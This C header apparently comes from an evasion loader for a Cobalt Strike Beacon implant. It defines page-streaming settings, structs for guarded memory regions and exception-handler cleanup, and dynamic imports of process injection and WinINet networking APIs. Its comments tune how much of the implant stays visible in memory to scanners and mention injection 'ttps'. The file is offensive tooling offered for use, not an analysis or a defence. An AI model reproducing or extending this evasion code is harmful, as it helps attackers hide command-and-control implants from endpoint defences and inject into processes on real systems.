#pragma once
#include <windows.h>
#include <wininet.h>

/*
* You can tune these to your liking. Raphael's original PoC uses a MAXVISIBLE value of 3 which will work
* with Beacon, however some commands (i.e. inject) will take a *very* long time. If you set it to 15,
* there will be no perf hit but you increase your in-memory visibility. 6 is a workable trade off.
* NB Page streaming can *impact* process injection, so it is recommended testing this value with your specific ttps.
*/
#define MAXVISIBLE 6
#define MAXREGIONS 16

#define DLL_BEACON_START 0x04
typedef long NTSTATUS;

/* Records allocated memory + VEH so we can free them on exit. */
typedef struct {
    char *   virtualDll;
    char *   streamDll;
    PVOID    hExceptionHandler;
} PAGE_STREAM_CLEANUP, *PPAGE_STREAM_CLEANUP;

/*
* Used to track our guarded regions.
*/
typedef struct {
    ULONG_PTR   start;
    ULONG_PTR   end;
    DWORD       permissions;
    char      * source;
} GUARDREGION;

typedef struct {
    char      * pages[MAXVISIBLE];
    int         index;
    DWORD       prot[MAXVISIBLE];
} REGIONQUEUE;

#define OLDESTPAGE() state.pages[state.index % MAXVISIBLE]

DECLSPEC_IMPORT FARPROC   WINAPI KERNEL32$GetProcAddress                 (HMODULE hModule, LPCSTR lpProcName);
DECLSPEC_IMPORT FARPROC   WINAPI KERNEL32$LoadLibraryA                   (LPCSTR lpLibFileName);
DECLSPEC_IMPORT HMODULE   WINAPI KERNEL32$GetModuleHandleA               (LPCSTR lpModuleName);
DECLSPEC_IMPORT LPVOID    WINAPI KERNEL32$VirtualAlloc                   (LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT LPVOID    WINAPI KERNEL32$VirtualAllocEx                 (HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$VirtualProtect                 (LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$VirtualProtectEx               (HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$VirtualFree                    (LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT SIZE_T    WINAPI KERNEL32$VirtualQuery                   (LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$GetThreadContext               (HANDLE, LPCONTEXT);
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$SetThreadContext               (HANDLE, const CONTEXT *);
DECLSPEC_IMPORT DWORD     WINAPI KERNEL32$ResumeThread                   (HANDLE);
DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$CreateThread                   (LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$CreateRemoteThread             (HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$OpenProcess                    (DWORD, BOOL, DWORD);
DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$OpenThread                     (DWORD, BOOL, DWORD);
DECLSPEC_IMPORT VOID      WINAPI KERNEL32$ExitThread                     (DWORD);
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$CloseHandle                    (HANDLE);
DECLSPEC_IMPORT VOID      WINAPI KERNEL32$Sleep                          (DWORD);
DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$CreateFileMappingA             (HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
DECLSPEC_IMPORT LPVOID    WINAPI KERNEL32$MapViewOfFile                  (HANDLE, DWORD, DWORD, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$UnmapViewOfFile                (LPCVOID);
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$DuplicateHandle                (HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$ReadProcessMemory              (HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T *);
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$WriteProcessMemory             (HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$CreateProcessA                 (LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$FlushInstructionCache          (HANDLE hProcess, LPCVOID lpBaseAddress, SIZE_T dwSize);
DECLSPEC_IMPORT PVOID     WINAPI KERNEL32$AddVectoredExceptionHandler    (ULONG First, PVECTORED_EXCEPTION_HANDLER Handler);
DECLSPEC_IMPORT PVOID     WINAPI KERNEL32$RemoveVectoredExceptionHandler (PVOID Handle);
DECLSPEC_IMPORT DWORD     WINAPI KERNEL32$WaitForSingleObject            (HANDLE hHandle, DWORD dwMilliseconds);
DECLSPEC_IMPORT VOID      WINAPI KERNEL32$ExitProcess                    (UINT uExitCode);
DECLSPEC_IMPORT VOID      WINAPI KERNEL32$ExitThread                     (DWORD dwExitCode);
DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetOpenA                   (DWORD dwExitCode, LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags);
DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetConnectA                (HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);

/* If you want to debug via an exe, you need to make these normal imports. */
#if DEBUG_EXE
#define KERNEL32$GetProcAddress GetProcAddress
#define KERNEL32$LoadLibraryA LoadLibraryA
#define KERNEL32$GetModuleHandleA GetModuleHandleA
#define KERNEL32$VirtualAlloc VirtualAlloc
#define KERNEL32$VirtualAllocEx VirtualAllocEx
#define KERNEL32$VirtualProtect VirtualProtect
#define KERNEL32$VirtualProtectEx VirtualProtectEx
#define KERNEL32$VirtualFree VirtualFree
#define KERNEL32$VirtualQuery VirtualQuery
#define KERNEL32$GetThreadContext GetThreadContext
#define KERNEL32$SetThreadContext SetThreadContext
#define KERNEL32$ResumeThread ResumeThread
#define KERNEL32$CreateThread CreateThread
#define KERNEL32$CreateRemoteThread CreateRemoteThread
#define KERNEL32$OpenProcess OpenProcess
#define KERNEL32$OpenThread OpenThread
#define KERNEL32$ExitThread ExitThread
#define KERNEL32$CloseHandle CloseHandle
#define KERNEL32$Sleep Sleep
#define KERNEL32$CreateFileMappingA CreateFileMappingA
#define KERNEL32$MapViewOfFile MapViewOfFile
#define KERNEL32$UnmapViewOfFile UnmapViewOfFile
#define KERNEL32$DuplicateHandle DuplicateHandle
#define KERNEL32$ReadProcessMemory ReadProcessMemory
#define KERNEL32$WriteProcessMemory WriteProcessMemory
#define KERNEL32$CreateProcessA CreateProcessA
#define KERNEL32$FlushInstructionCache FlushInstructionCache
#define KERNEL32$AddVectoredExceptionHandler AddVectoredExceptionHandler
#define KERNEL32$RemoveVectoredExceptionHandler RemoveVectoredExceptionHandler
#define KERNEL32$WaitForSingleObject WaitForSingleObject
#define KERNEL32$ExitProcess ExitProcess
#define KERNEL32$ExitThread ExitThread
#define WININET$InternetOpenA InternetOpenA
#define WININET$InternetConnectA InternetConnectA
#endif
